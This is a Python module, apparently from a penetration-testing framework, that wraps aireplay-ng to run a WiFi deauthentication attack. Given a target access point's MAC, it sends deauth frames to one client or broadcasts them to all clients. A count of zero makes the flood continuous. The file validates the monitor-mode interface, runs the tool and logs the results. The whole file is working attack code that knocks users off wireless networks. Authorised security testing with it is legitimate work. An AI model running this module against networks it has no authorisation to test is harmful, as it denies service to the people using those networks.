#!/usr/bin/env python3
"""
wifi_deauth — Deauthentication attack via aireplay-ng.

Source: Argos-native (not in PentAGI or Artemis).
CLI deps: aircrack-ng suite (aireplay-ng)

Sends deauthentication frames to disconnect a client from an AP,
or broadcasts deauth to all clients on an AP.

REQUIRES: Monitor mode interface (type 803 in /sys/class/net/{iface}/type).
"""

from base_module import TacticalModule


class WiFiDeauth(TacticalModule):
    name = "wifi_deauth"
    description = "Deauthentication attack via aireplay-ng"

    def _add_module_args(self) -> None:
        self.parser.add_argument(
            "--bssid",
            required=True,
            help="Target AP BSSID (MAC address, e.g. AA:BB:CC:DD:EE:FF)",
        )
        self.parser.add_argument(
            "--client",
            help="Specific client MAC to deauth (default: broadcast to all)",
        )
        self.parser.add_argument(
            "--interface",
            default="wlan0mon",
            help="Monitor mode interface (default: wlan0mon)",
        )
        self.parser.add_argument(
            "--count",
            type=int,
            default=10,
            help="Number of deauth frames to send (default: 10, 0=continuous)",
        )

    def run(self, args) -> None:
        # Validate BSSID
        if not self.validate_mac(args.bssid):
            self.output_error(
                f"Invalid BSSID format: {args.bssid}. Expected AA:BB:CC:DD:EE:FF"
            )
            return

        # Validate client MAC if specified
        if args.client and not self.validate_mac(args.client):
            self.output_error(
                f"Invalid client MAC format: {args.client}. Expected AA:BB:CC:DD:EE:FF"
            )
            return

        # Validate interface name
        if not self.validate_interface(args.interface):
            self.output_error(
                f"Invalid interface name: {args.interface}"
            )
            return

        # Check interface exists
        if not self.check_interface_exists(args.interface):
            self.output_error(
                f"Interface {args.interface} does not exist. "
                f"Run 'airmon-ng start <iface>' to create a monitor interface."
            )
            return

        # Check monitor mode
        if not self.check_monitor_mode(args.interface):
            self.output_error(
                f"Interface {args.interface} is not in monitor mode (type != 803). "
                f"Run 'airmon-ng start {args.interface.replace('mon', '')}' first."
            )
            return

        # Build aireplay-ng command
        aireplay_args = [
            "--deauth", str(args.count),
            "-a", args.bssid,
        ]

        if args.client:
            aireplay_args.extend(["-c", args.client])

        aireplay_args.append(args.interface)

        # Execute
        import time
        start = time.monotonic()
        result = self.run_tool("aireplay-ng", aireplay_args, timeout=args.timeout)
        duration_ms = int((time.monotonic() - start) * 1000)

        # Parse output
        frames_sent = self._parse_frames_sent(result.stdout)

        # Log to DB
        import json
        self.log_run(
            args.db_path,
            self.name,
            json.dumps(vars(args), default=str),
            result.returncode,
            result.stdout,
            result.stderr,
            duration_ms,
        )

        if result.returncode == 0:
            self.output_success({
                "target_bssid": args.bssid,
                "client": args.client,
                "interface": args.interface,
                "frames_sent": frames_sent,
                "count_requested": args.count,
                "duration_ms": duration_ms,
                "raw_output": result.stdout[:2000],
            })
        else:
            self.output_error(
                f"aireplay-ng failed (exit {result.returncode})",
                {
                    "target_bssid": args.bssid,
                    "stderr": result.stderr[:2000],
                    "stdout": result.stdout[:2000],
                },
            )

    @staticmethod
    def _parse_frames_sent(stdout: str) -> int:
        """Parse aireplay-ng output for number of deauth frames sent."""
        import re
        # aireplay-ng output: "Sending 64 directed DeAuth..."
        # or "Sending DeAuth to broadcast..."
        total = 0
        for match in re.finditer(r"Sending\s+(\d+)\s+directed", stdout):
            total += int(match.group(1))
        # If broadcast, count the number of "Sending DeAuth" lines
        if total == 0:
            total = stdout.count("Sending DeAuth")
        return total


if __name__ == "__main__":
    WiFiDeauth().execute()
